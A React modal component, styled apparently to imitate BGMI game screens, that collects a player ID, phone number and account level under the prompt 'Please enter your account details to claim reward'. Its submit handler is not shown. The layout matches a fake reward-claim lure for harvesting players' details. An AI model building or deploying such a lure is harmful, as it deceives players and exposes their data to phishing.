import React, { useState } from 'react';
import { X, AlertCircle, Loader2, ChevronDown } from 'lucide-react';

export default function VerificationModal({ onClose, onSubmitVerification }) {
  const [formData, setFormData] = useState({
    playerId: '',
    phoneNumber: '',
    accountLevel: '50', // Default level 50 selected
  });

  const [errors, setErrors] = useState({});
  const [submitting, setSubmitting] = useState(false);

  // Generate levels array 1 to 100
  const accountLevels = Array.from({ length: 100 }, (_, i) => i + 1);

  const validate = () => {
    const errs = {};
    const enteredPId = String(formData.playerId).trim();
    const enteredPhone = String(formData.phoneNumber).replace(/\s+/g, '');

    // Player ID validation
    if (!enteredPId) {
      errs.playerId = 'Player ID is required';
    } else if (!/^\d{8,12}$/.test(enteredPId)) {
      errs.playerId = 'Player ID must be 8-12 numbers';
    }

    // Phone Number validation
    if (!formData.phoneNumber.trim()) {
      errs.phoneNumber = 'Phone number is required';
    } else if (!/^\+?[0-9]{8,15}$/.test(enteredPhone)) {
      errs.phoneNumber = 'Enter a valid phone number (e.g. +919876543210)';
    }

    // Account Level validation
    if (!formData.accountLevel) {
      errs.accountLevel = 'Please select account level';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    setSubmitting(true);
    try {
      await onSubmitVerification(formData);
    } catch (err) {
      setErrors({ server: 'Verification failed. Please try again.' });
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xs animate-fadeIn">
      <div className="relative w-full max-w-md bg-bgmi-dark border-2 border-bgmi-gold/60 rounded shadow-2xl overflow-hidden">
        
        {/* Header Bar matching Screenshot 2 */}
        <div className="bg-bgmi-black border-b border-bgmi-gray px-4 py-3 flex items-center justify-between">
          <h3 className="font-gaming text-2xl font-bold tracking-wider text-white uppercase text-center w-full pl-6">
            Account Verification
          </h3>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white p-1 rounded transition-colors"
          >
            <X className="w-6 h-6" />
          </button>
        </div>

        {/* Modal Form Content */}
        <form onSubmit={handleSubmit} className="p-6 flex flex-col space-y-5">
          <p className="font-gaming text-xl text-center text-gray-300 tracking-wide">
            Please enter your account details to claim reward
          </p>

          {errors.server && (
            <div className="p-3 bg-red-950/90 border border-red-500 text-red-200 text-xs rounded flex items-center gap-2">
              <AlertCircle className="w-5 h-5 shrink-0 text-red-400" />
              <span>{errors.server}</span>
            </div>
          )}

          {/* Form Inputs matching Screenshot 2 */}
          <div className="space-y-4">
            
            {/* Player ID */}
            <div>
              <label className="block text-xs text-gray-400 mb-1">Player ID</label>
              <input
                type="text"
                placeholder="Player ID"
                value={formData.playerId}
                onChange={(e) => setFormData({ ...formData, playerId: e.target.value })}
                className="w-full bg-bgmi-black border border-gray-400 focus:border-bgmi-gold text-white font-gaming text-xl px-4 py-2.5 rounded outline-none placeholder:text-gray-400 placeholder:font-gaming"
              />
              {errors.playerId && (
                <p className="text-red-400 text-xs mt-1">{errors.playerId}</p>
              )}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-xs text-gray-400 mb-1">Phone Number</label>
              <input
                type="tel"
                placeholder="Phone Number"
                value={formData.phoneNumber}
                onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
                className="w-full bg-bgmi-black border border-gray-400 focus:border-bgmi-gold text-white font-gaming text-xl px-4 py-2.5 rounded outline-none placeholder:text-gray-400 placeholder:font-gaming"
              />
              {errors.phoneNumber && (
                <p className="text-red-400 text-xs mt-1">{errors.phoneNumber}</p>
              )}
            </div>

            {/* Account Level Dropdown (1 to 100) */}
            <div>
              <label className="block text-xs text-gray-400 mb-1">Account Level (1 - 100)</label>
              <div className="relative">
                <select
                  value={formData.accountLevel}
                  onChange={(e) => setFormData({ ...formData, accountLevel: e.target.value })}
                  className="w-full bg-bgmi-black border border-gray-400 focus:border-bgmi-gold text-white font-gaming text-xl px-4 py-2.5 rounded outline-none appearance-none cursor-pointer pr-10"
                >
                  <option value="" disabled>Select Level (1 - 100)</option>
                  {accountLevels.map((lvl) => (
                    <option key={lvl} value={lvl} className="bg-bgmi-black text-white py-1">
                      Level {lvl}
                    </option>
                  ))}
                </select>
                <ChevronDown className="w-6 h-6 text-bgmi-gold absolute right-3 top-3 pointer-events-none" />
              </div>
              {errors.accountLevel && (
                <p className="text-red-400 text-xs mt-1">{errors.accountLevel}</p>
              )}
            </div>
          </div>

          {/* Submit Verification Button matching Screenshot 2 */}
          <div className="pt-2 flex justify-center">
            <button
              type="submit"
              disabled={submitting}
              className="w-full max-w-xs btn-gold py-2.5 text-2xl tracking-widest rounded shadow-gold-glow flex items-center justify-center space-x-2"
            >
              {submitting ? (
                <>
                  <Loader2 className="w-6 h-6 animate-spin text-black" />
                  <span>VERIFYING...</span>
                </>
              ) : (
                <span>VERIFICATION</span>
              )}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
